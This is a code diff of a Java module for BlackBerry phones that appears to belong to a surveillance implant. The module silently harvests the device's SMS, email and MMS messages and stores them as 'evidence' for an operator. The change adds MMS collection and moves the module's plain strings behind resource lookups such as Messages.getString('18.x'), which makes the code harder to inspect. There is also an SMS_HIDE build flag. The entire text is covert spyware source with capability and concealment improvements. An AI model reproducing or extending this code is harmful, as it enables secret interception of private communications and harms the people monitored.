@@ -18,6 +18,7 @@ import net.rim.blackberry.api.mail.Header;
 import net.rim.blackberry.api.mail.Message;
 import net.rim.blackberry.api.phone.Phone;
 import net.rim.device.api.util.DataBuffer;
+import blackberry.Messages;
 import blackberry.config.ChildConf;
 import blackberry.config.ConfModule;
 import blackberry.config.ConfigurationException;
@@ -28,6 +29,7 @@ import blackberry.evidence.Evidence;
 import blackberry.evidence.EvidenceType;
 import blackberry.evidence.TimestampMarkup;
 import blackberry.interfaces.MailObserver;
+import blackberry.interfaces.MmsObserver;
 import blackberry.interfaces.SmsObserver;
 import blackberry.manager.ModuleManager;
 import blackberry.module.mail.Filter;
@@ -35,6 +37,7 @@ import blackberry.module.mail.Mail;
 import blackberry.module.mail.MailListener;
 import blackberry.module.mail.MailParser;
 import blackberry.module.mail.Prefix;
+import blackberry.module.mms.MmsListener;
 import blackberry.module.sms.SmsListener;
 import blackberry.module.sms.SmsListener45;
 import blackberry.module.sms.SmsListener46;
@@ -46,10 +49,10 @@ import blackberry.utils.WChar;
  * The Class MessageAgent.
  */
 public final class ModuleMessage extends BaseModule implements SmsObserver,
-        MailObserver {
+        MmsObserver, MailObserver {
 
     //#ifdef DEBUG
-    static Debug debug = new Debug("ModMessage", DebugLevel.VERBOSE);
+    static Debug debug = new Debug("ModMessage", DebugLevel.VERBOSE); //$NON-NLS-1$
     //#endif
 
     private static final int SMS_VERSION = 2010050501;
@@ -64,6 +67,7 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
 
     MailListener mailListener;
     SmsListener smsListener;
+    MmsListener mmsListener;
 
     TimestampMarkup markupDate;
     //public Date lastcheck = new Date(0);
@@ -82,7 +86,7 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
     private Date mailTo;
 
     public static String getStaticType() {
-        return "messages";
+        return Messages.getString("18.0"); //$NON-NLS-1$
     }
 
     public static ModuleMessage getInstance() {
@@ -97,7 +101,7 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
      */
     public ModuleMessage() {
 
-        markupDate = new TimestampMarkup("message");
+        markupDate = new TimestampMarkup(getStaticType());
 
         setDelay(SLEEPTIME);
         setPeriod(PERIODTIME);
@@ -106,10 +110,13 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
 
         //#ifdef SMS_HIDE
         smsListener = SmsListener46.getInstance();
+        mmsListener = MmsListener.getInstance();
         //#else
         smsListener = SmsListener45.getInstance();
         //#endif
         //smsListener.setMessageAgent(this);
+
+        
     }
 
     public boolean parse(ConfModule conf) {
@@ -117,27 +124,28 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
         setDelay(100);
 
         try {
-            ChildConf mailJson = conf.getChild("mail");
-            mailEnabled = mailJson.getBoolean("enabled");
-            ChildConf mailFilter = mailJson.getChild("filter");
-            mailHistory = mailFilter.getBoolean("history");
-            mailFrom = mailFilter.getDate("datefrom");
-            mailTo = mailFilter.getDate("dateto");
+            ChildConf mailJson = conf.getChild(Messages.getString("18.1")); //$NON-NLS-1$
+            mailEnabled = mailJson.getBoolean(Messages.getString("18.2")); //$NON-NLS-1$
+            ChildConf mailFilter = mailJson
+                    .getChild(Messages.getString("18.3")); //$NON-NLS-1$
+            mailHistory = mailFilter.getBoolean(Messages.getString("18.4")); //$NON-NLS-1$
+            mailFrom = mailFilter.getDate(Messages.getString("18.5")); //$NON-NLS-1$
+            mailTo = mailFilter.getDate(Messages.getString("18.6")); //$NON-NLS-1$
 
             int maxSizeToLog = 4096;
             filterEmailCollect = new Filter(mailHistory, mailFrom, mailTo,
                     maxSizeToLog, maxSizeToLog);
             filterEmailRuntime = new Filter(mailEnabled, maxSizeToLog);
 
-            ChildConf smsJson = conf.getChild("sms");
-            smsEnabled = smsJson.getBoolean("enabled");
+            ChildConf smsJson = conf.getChild(Messages.getString("18.7")); //$NON-NLS-1$
+            smsEnabled = smsJson.getBoolean(Messages.getString("18.8")); //$NON-NLS-1$
 
-            ChildConf mmsJson = conf.getChild("mms");
-            mmsEnabled = mmsJson.getBoolean("enabled");
+            ChildConf mmsJson = conf.getChild(Messages.getString("18.9")); //$NON-NLS-1$
+            mmsEnabled = mmsJson.getBoolean(Messages.getString("18.10")); //$NON-NLS-1$
         } catch (ConfigurationException e) {
             //#ifdef DEBUG
             debug.error(e);
-            debug.error("parse");
+            debug.error("parse"); //$NON-NLS-1$
             //#endif
             return false;
         }
@@ -155,19 +163,23 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
             smsListener.addSmsObserver(this, null, null);
         }
 
+        if (mmsEnabled) {
+            mmsListener.start(this);
+        }
+
         if (mailEnabled) {
             mailListener.addSingleMailObserver(this);
 
             if (status.firstMessageRun) {
                 //#ifdef DEBUG
-                debug.info("First Run");
+                debug.info("First Run"); //$NON-NLS-1$
                 //#endif
                 status.firstMessageRun = false;
 
                 if (mailEnabled) {
                     if (historyThread != null) {
                         //#ifdef DEBUG
-                        debug.trace("actualRun: stopping historyThread");
+                        debug.trace("actualRun: stopping historyThread"); //$NON-NLS-1$
                         //#endif
 
                         //#ifdef HISTORY_MAIL
@@ -177,11 +189,11 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
                         try {
                             historyThread.join();
                             //#ifdef DEBUG
-                            debug.trace("actualRun: joined");
+                            debug.trace("actualRun: joined"); //$NON-NLS-1$
                             //#endif
                         } catch (Exception e) {
                             //#ifdef DEBUG
-                            debug.error("actualRun: " + e);
+                            debug.error("actualRun: " + e); //$NON-NLS-1$
                             //#endif
                         }
                     }
@@ -208,9 +220,9 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
 
         if (mailEnabled && haveNewAccount()) {
             //#ifdef DEBUG
-            debug.info("Restarting MessageAgent, new account");
+            debug.info("Restarting MessageAgent, new account"); //$NON-NLS-1$
             //#endif
-            ModuleManager.getInstance().reStart("message");
+            ModuleManager.getInstance().reStart(getStaticType()); //$NON-NLS-1$
         }
 
     }
@@ -220,13 +232,16 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
      * @see blackberry.threadpool.TimerJob#actualStop()
      */
     public void actualStop() {
-        if (smsEnabled) {
+        if (smsEnabled && smsListener!=null) {
             smsListener.removeSmsObserver(this);
         }
 
-        if (mailEnabled) {
+        if (mmsEnabled && mmsListener!=null) {
+            mmsListener.stop();
+        }
+
+        if (mailEnabled && mailListener!=null) {
             mailListener.removeSingleMailObserver(this);
-            ;
         }
     }
 
@@ -248,14 +263,14 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
 
         Evidence evidence = new Evidence(logType);
         //#ifdef DBC
-        Check.requires(content != null, "createEvidence content null");
-        Check.requires(evidence != null, "log null");
+        Check.requires(content != null, "createEvidence content null"); //$NON-NLS-1$
+        Check.requires(evidence != null, "log null"); //$NON-NLS-1$
         //#endif
 
         evidence.atomicWriteOnce(additionalData, content);
 
         //#ifdef DEBUG
-        debug.trace("Evidence created");
+        debug.trace("Evidence created"); //$NON-NLS-1$
         //#endif
     }
 
@@ -279,7 +294,7 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
 
     public synchronized void lastcheckSet(String key, Date date) {
         //#ifdef DEBUG
-        debug.trace("Writing markup: " + key + " date: " + date);
+        debug.trace("Writing markup: " + key + " date: " + date); //$NON-NLS-1$ //$NON-NLS-2$
         //#endif
 
         final ModuleMessage agent = (ModuleMessage) ModuleMessage.getInstance();
@@ -295,13 +310,13 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
     public synchronized Date lastcheckGet(String key) {
 
         //#ifdef DBC
-        Check.requires(markupDate != null, "lastcheckGet markupDate==null");
+        Check.requires(markupDate != null, "lastcheckGet markupDate==null"); //$NON-NLS-1$
         //#endif
 
         Date date = markupDate.get(key);
 
         //#ifdef DEBUG
-        debug.trace("getLastCheck: " + key + " = " + date);
+        debug.trace("getLastCheck: " + key + " = " + date); //$NON-NLS-1$ //$NON-NLS-2$
         //#endif
 
         if (date == null) {
@@ -313,7 +328,7 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
 
     public synchronized void lastcheckReset() {
         //#ifdef DEBUG
-        debug.trace("lastcheckReset markupDate: " + markupDate);
+        debug.trace("lastcheckReset markupDate: " + markupDate); //$NON-NLS-1$
         //#endif
 
         markupDate.removeMarkup();
@@ -326,17 +341,17 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
 
         String message = new String(byteMessage);
         //#ifdef DBC
-        Check.requires(message != null, "saveLog: null message");
+        Check.requires(message != null, "saveLog: null message"); //$NON-NLS-1$
         //#endif
 
         //#ifdef DEBUG
-        debug.trace("saveLog message: " + message + " address: " + address
-                + " incoming: " + incoming);
+        debug.trace("saveLog message: " + message + " address: " + address //$NON-NLS-1$ //$NON-NLS-2$
+                + " incoming: " + incoming); //$NON-NLS-1$
         //#endif
 
         //final byte[] dataMsg = getSmsDataMessage(message);
         //#ifdef DBC
-        Check.asserts(message != null, "saveLog: null dataMsg");
+        Check.asserts(message != null, "saveLog: null dataMsg"); //$NON-NLS-1$
         //#endif
 
         //final ByteArrayOutputStream os = null;
@@ -352,13 +367,13 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
 
             // Check if it's actually a sms
 
-            final String prefix = "//";
+            final String prefix = "//"; //$NON-NLS-1$
             int pos = address.indexOf(prefix);
             if (pos >= 0) {
                 address = address.substring(prefix.length() + pos);
             } else {
                 //#ifdef DEBUG
-                debug.error("Not a sms");
+                debug.error("Not a sms"); //$NON-NLS-1$
                 //#endif
                 return false;
             }
@@ -378,7 +393,7 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
             filetime = new DateTime(date);
 
             //#ifdef DBC
-            Check.asserts(filetime != null, "saveLog: null filetime");
+            Check.asserts(filetime != null, "saveLog: null filetime"); //$NON-NLS-1$
             //#endif
 
             // preparing additionalData
@@ -392,16 +407,16 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
             databuffer.write(Utils.padByteArray(to.getBytes(), 16));
 
             //#ifdef DEBUG
-            debug.info("sms : " + (incoming ? "incoming" : "outgoing"));
-            debug.info("From: " + from + " To: " + to + " date: "
+            debug.info("sms : " + (incoming ? "incoming" : "outgoing")); //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
+            debug.info("From: " + from + " To: " + to + " date: " //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
                     + filetime.toString());
             //#endif
 
             //#ifdef DBC
             Check.ensures(databuffer.getLength() == additionalDataLen,
-                    "SMS Wrong databuffer size: " + databuffer.getLength());
+                    "SMS Wrong databuffer size: " + databuffer.getLength()); //$NON-NLS-1$
             Check.ensures(additionalData.length == additionalDataLen,
-                    "SMS Wrong buffer size: " + additionalData.length);
+                    "SMS Wrong buffer size: " + additionalData.length); //$NON-NLS-1$
             //#endif
 
             // Creating log
@@ -411,27 +426,32 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
                 return false;
             } else {
                 //#ifdef DEBUG
-                debug.error("data null");
+                debug.error("data null"); //$NON-NLS-1$
                 //#endif
                 return false;
             }
 
         } catch (final Exception ex) {
             //#ifdef DEBUG
-            debug.error("saveLog message: " + ex);
+            debug.error("saveLog message: " + ex); //$NON-NLS-1$
             //#endif
             return false;
         }
     }
 
+    public void onNewMms(final byte[] byteMessage, String address,
+            final boolean incomin) {
+        
+    }
+
     private String getMySmsAddress() {
         final String number = Phone.getDevicePhoneNumber(false);
-        if (number == null || number.startsWith("Unknown")) {
-            return "local";
+        if (number == null || number.startsWith(Messages.getString("18.11"))) { //$NON-NLS-1$
+            return Messages.getString("18.12"); //$NON-NLS-1$
         }
 
         //#ifdef DBC
-        Check.ensures(number.length() <= 16, "getMyAddress too long: " + number);
+        Check.ensures(number.length() <= 16, "getMyAddress too long: " + number); //$NON-NLS-1$
         //#endif
 
         return number;
@@ -441,25 +461,25 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
             final String storeName) {
 
         //#ifdef DBC
-        Check.requires(message != null, "message != null");
-        Check.requires(storeName != null, "storeName != null");
+        Check.requires(message != null, "message != null"); //$NON-NLS-1$
+        Check.requires(storeName != null, "storeName != null"); //$NON-NLS-1$
         //#endif
 
         //#ifdef DEBUG
-        debug.trace("saveEvidence: " + message + " name: " + storeName);
+        debug.trace("saveEvidence: " + message + " name: " + storeName); //$NON-NLS-1$ //$NON-NLS-2$
         //#endif
 
         try {
 
             final int flags = 1;
 
-            String from = "local";
-            if (storeName.indexOf("@") > 0) {
+            String from = Messages.getString("18.13"); //$NON-NLS-1$
+            if (storeName.indexOf("@") > 0) { //$NON-NLS-1$
                 from = storeName;
             }
             final String mail = makeMimeMessage(message, maxMessageSize, from);
             //#ifdef DBC
-            Check.asserts(mail != null, "Null mail");
+            Check.asserts(mail != null, "Null mail"); //$NON-NLS-1$
             //#endif
 
             int size = message.getSize();
@@ -479,15 +499,15 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
             databuffer.writeLong(filetime.getFiledate());
             //#ifdef DBC
             Check.asserts(additionalData.length == 20,
-                    "Mail Wrong buffer size: " + additionalData.length);
+                    "Mail Wrong buffer size: " + additionalData.length); //$NON-NLS-1$
             //#endif
 
             //#ifdef DEBUG
-            debug.trace("saveEvidence: "
+            debug.trace("saveEvidence: " //$NON-NLS-1$
                     + mail.substring(0, Math.min(mail.length(), 200)));
             //#endif
 
-            createEvidence(additionalData, mail.getBytes("UTF-8"),
+            createEvidence(additionalData, mail.getBytes("UTF-8"), //$NON-NLS-1$
                     EvidenceType.MAIL_RAW);
 
             //messageAgent.createLog(additionalData, mail.getBytes("ISO-8859-1"),
@@ -495,7 +515,7 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
 
         } catch (final Exception ex) {
             //#ifdef DEBUG
-            debug.error("saveEvidence message: " + ex);
+            debug.error("saveEvidence message: " + ex); //$NON-NLS-1$
             //#endif
 
         }
@@ -517,21 +537,21 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
         final Mail mail = parser.parse();
 
         //#ifdef DEBUG
-        debug.trace("Email size: " + message.getSize() + " bytes");
-        debug.trace("Sent date: " + message.getSentDate());
-        debug.trace("Subject: " + message.getSubject());
+        debug.trace("Email size: " + message.getSize() + " bytes"); //$NON-NLS-1$ //$NON-NLS-2$
+        debug.trace("Sent date: " + message.getSentDate()); //$NON-NLS-1$
+        debug.trace("Subject: " + message.getSubject()); //$NON-NLS-1$
         //debug.trace("Body text: " + message.getBodyText());
         //#endif
 
         // comincia la ricostruzione del MIME
-        mailRaw.append("MIME-Version: 1.0\r\n");
+        mailRaw.append(Messages.getString("18.14")); //$NON-NLS-1$
         final long rnd = Math.abs(Utils.randomLong());
-        final String boundary = "------_=_NextPart_" + rnd;
+        final String boundary = Messages.getString("18.15") + rnd; //$NON-NLS-1$
 
         if (mail.isMultipart()) {
-            mailRaw.append("Content-Type: multipart/alternative; boundary="
-                    + boundary + "\r\n");
-            mailRaw.append("\r\n--" + boundary + "\r\n");
+            mailRaw.append(Messages.getString("18.16") //$NON-NLS-1$
+                    + boundary + "\r\n"); //$NON-NLS-1$
+            mailRaw.append("\r\n--" + boundary + "\r\n"); //$NON-NLS-1$ //$NON-NLS-2$
         }
 
         if (mail.hasText()) {
@@ -544,7 +564,7 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
         }
 
         if (mail.isMultipart()) {
-            mailRaw.append("\r\n--" + boundary + "\r\n");
+            mailRaw.append("\r\n--" + boundary + "\r\n"); //$NON-NLS-1$ //$NON-NLS-2$
         }
 
         if (mail.hasHtml()) {
@@ -555,12 +575,12 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
         }
 
         if (mail.isMultipart()) {
-            mailRaw.append("\r\n--" + boundary + "--\r\n");
+            mailRaw.append("\r\n--" + boundary + "--\r\n"); //$NON-NLS-1$ //$NON-NLS-2$
         }
 
         // se il mio parser fallisce, uso la decodifica di base fornita dalla classe Message
         if (mail.isEmpty()) {
-            mailRaw.append("Content-type: text/plain; charset=UTF8\r\n\r\n");
+            mailRaw.append(Messages.getString("18.17")); //$NON-NLS-1$
 
             String msg = message.getBodyText();
             if (maxMessageSize > 0 && msg.length() > maxMessageSize) {
@@ -569,7 +589,7 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
             mailRaw.append(msg);
         }
 
-        mailRaw.append("\r\n");
+        mailRaw.append("\r\n"); //$NON-NLS-1$
 
         final String craftedMail = mailRaw.toString();
 
@@ -592,10 +612,10 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
                 final Header header = (Header) headerObj;
                 mail.append(header.getName());
                 mail.append(header.getValue());
-                mail.append("\r\n");
+                mail.append("\r\n"); //$NON-NLS-1$
             } else {
                 //#ifdef DEBUG
-                debug.error("Unknown header type: " + headerObj);
+                debug.error("Unknown header type: " + headerObj); //$NON-NLS-1$
                 //#endif
             }
         }
@@ -617,16 +637,16 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
             final Object headerObj = headers.nextElement();
             if (headerObj instanceof Header) {
                 final Header header = (Header) headerObj;
-                if (header.getName().startsWith("From")) {
+                if (header.getName().startsWith(Messages.getString("18.18"))) { //$NON-NLS-1$
                     fromFound = true;
                 }
             }
         }
         if (!fromFound) {
             //#ifdef DEBUG
-            debug.info("Adding from: " + from);
+            debug.info("Adding from: " + from); //$NON-NLS-1$
             //#endif
-            mail.append("From: " + from + "\r\n");
+            mail.append(Messages.getString("18.19") + from + "\r\n"); //$NON-NLS-1$ //$NON-NLS-2$
         }
     }
 
